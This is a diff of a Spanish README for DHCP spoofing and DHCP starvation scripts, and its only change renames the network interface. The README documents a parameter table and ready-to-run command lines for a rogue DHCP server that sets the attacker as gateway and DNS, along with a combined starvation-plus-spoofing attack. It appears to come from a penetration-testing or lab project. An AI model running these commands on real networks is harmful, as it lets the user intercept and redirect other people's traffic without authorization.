@@ -19,7 +19,7 @@ de las víctimas a través del atacante.
 
 | Parámetro | Descripción | Default |
 |-----------|-------------|---------|
-| `-i` | Interfaz de red (ej: eth0) | Obligatorio |
+| `-i` | Interfaz de red (ej: ens3) | Obligatorio |
 | `--pool` | Rango de IPs (ej: 192.168.1.200-220) | Obligatorio |
 | `--gateway` | Gateway a anunciar (IP del atacante) | Obligatorio |
 | `--dns` | Servidor DNS a anunciar | 8.8.8.8 |
@@ -50,12 +50,12 @@ de las víctimas a través del atacante.
 
 ```bash
 # Ataque básico
-sudo python3 dhcp_spoof.py -i eth0 \
+sudo python3 dhcp_spoof.py -i ens3 \
     --pool 192.168.1.200-220 \
     --gateway 192.168.1.50
 
 # Con DNS falso y lease corto
-sudo python3 dhcp_spoof.py -i eth0 \
+sudo python3 dhcp_spoof.py -i ens3 \
     --pool 192.168.1.200-220 \
     --gateway 192.168.1.50 \
     --dns 192.168.1.50 \
@@ -69,10 +69,10 @@ ip addr show
 ### Ataque combinado con DHCP Starvation
 ```bash
 # Paso 1: Agotar pool legítimo
-sudo python3 dhcp_starvation.py -i eth0 -c 300 &
+sudo python3 dhcp_starvation.py -i ens3 -c 300 &
 
 # Paso 2: Levantar servidor falso
-sudo python3 dhcp_spoof.py -i eth0 \
+sudo python3 dhcp_spoof.py -i ens3 \
     --pool 192.168.1.200-250 \
     --gateway 192.168.1.50
 ```
